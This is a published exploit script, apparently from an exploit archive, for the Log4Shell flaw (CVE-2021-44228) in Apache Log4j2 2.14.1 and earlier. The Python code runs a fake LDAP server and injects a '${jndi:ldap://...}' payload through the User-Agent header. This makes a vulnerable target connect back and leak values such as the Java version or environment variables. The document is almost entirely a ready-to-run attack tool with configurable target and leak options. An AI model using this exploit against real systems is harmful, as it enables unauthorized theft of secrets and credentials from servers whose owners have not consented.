# Exploit Title: Apache Log4j2 2.14.1 - Information Disclosure
# Date: 12/12/2021
# Exploit Author: leonjza
# Vendor Homepage: https://logging.apache.org/log4j/2.x/
# Version: <= 2.14.1
# CVE: CVE-2021-44228

#!/usr/bin/env python3

# Pure python ENV variable leak PoC for CVE-2021-44228
# Original PoC: https://twitter.com/Black2Fan/status/1470281005038817284
#
# 2021 @leonjza

import argparse
import socketserver
import threading
import time

import requests

LDAP_HEADER = b'\x30\x0c\x02\x01\x01\x61\x07\x0a\x01\x00\x04\x00\x04\x00\x0a'


class ThreadedTCPRequestHandler(socketserver.BaseRequestHandler):
    def handle(self) -> None:
        print(f' i| new connection from {self.client_address[0]}')

        sock = self.request
        sock.recv(1024)
        sock.sendall(LDAP_HEADER)

        data = sock.recv(1024)
        data = data[9:]  # strip header

        # example response
        #
        # ('Java version 11.0.13\n'
        #  '\x01\x00\n'
        #  '\x01\x03\x02\x01\x00\x02\x01\x00\x01\x01\x00\x0b'
        #  'objectClass0\x00\x1b0\x19\x04\x172.16.840.1.113730.3.4.2')

        data = data.decode(errors='ignore').split('\n')[0]
        print(f' v| extracted value: {data}')


class ThreadedTCPServer(socketserver.ThreadingMixIn, socketserver.TCPServer):
    pass


def main():
    parser = argparse.ArgumentParser(description='a simple log4j
<=2.14 information disclosure poc '
                                                 '(ref:
https://twitter.com/Black2Fan/status/1470281005038817284)')
    parser.add_argument('--target', '-t', required=True, help='target uri')
    parser.add_argument('--listen-host', default='0.0.0.0',
                        help='exploit server host to listen on
(default: 127.0.0.1)')
    parser.add_argument('--listen-port', '-lp', default=8888,
help='exploit server port to listen on (default: 8888)')
    parser.add_argument('--exploit-host', '-eh', required=True,
default='127.0.0.1',
                        help='host where (this) exploit server is reachable')
    parser.add_argument('--leak', '-l', default='${java:version}',
                        help='value to leak. '
                             'see:
https://twitter.com/Rayhan0x01/status/1469571563674505217 '
                             '(default: ${java:version})')
    args = parser.parse_args()

    print(f' i| starting server on {args.listen_host}:{args.listen_port}')
    server = ThreadedTCPServer((args.listen_host, args.listen_port),
ThreadedTCPRequestHandler)

    serv_thread = threading.Thread(target=server.serve_forever)
    serv_thread.daemon = True
    serv_thread.start()
    time.sleep(1)
    print(f' i| server started')

    payload = f'${{jndi:ldap://{args.exploit_host}:{args.listen_port}/{args.leak}}}'
    print(f' i| sending exploit payload {payload} to {args.target}')

    try:
        r = requests.get(args.target, headers={'User-Agent': payload})
        print(f' i| response status code: {r.status_code}')
        print(f' i| response: {r.text}')
    except Exception as e:
        print(f' e| failed to make request: {e}')
    finally:
        server.shutdown()
        server.server_close()


if __name__ == '__main__':
    main()